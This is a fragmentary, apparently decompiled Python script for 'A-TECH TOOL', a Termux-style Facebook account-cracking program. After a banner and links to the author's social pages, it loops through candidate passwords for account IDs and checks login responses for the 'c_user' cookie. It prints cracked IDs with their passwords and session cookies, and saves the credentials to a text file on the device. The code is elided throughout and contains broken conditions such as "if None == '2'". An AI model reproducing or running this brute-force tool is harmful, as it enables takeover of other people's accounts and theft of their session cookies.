...
def FD():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://youtube.com/@sayedqasimnasimi')
...
def o():
    ...
    if None == '2':
        ...
        os.system('xdg-open https://www.facebook.com/khyber.momand.50')
    ...
    if None == '4':
        ...
        os.system('xdg-open https://facebook.com/groups/1113723015488810/')
...
\__|  \__|        \__|   \________| \______/ \__|  \__|                                   

\033[1;37m================= \33[32;45mFeel the power of MOHAMMAD\33[0;m =====================

\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMohammad\33[0;m\033[1;32m \033[1;33mTANHA\33[0;m
...
\033[1;37m \33[32;45m\33[0;m
      ...
      \33[37;41m\t WELLCOME TO A-TECH TOOL\33[0;m
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(A-TECH-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/A-TECH-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(A-TECH-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
        ...
        sys.stdout.write('\r     %s[A-TECH] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
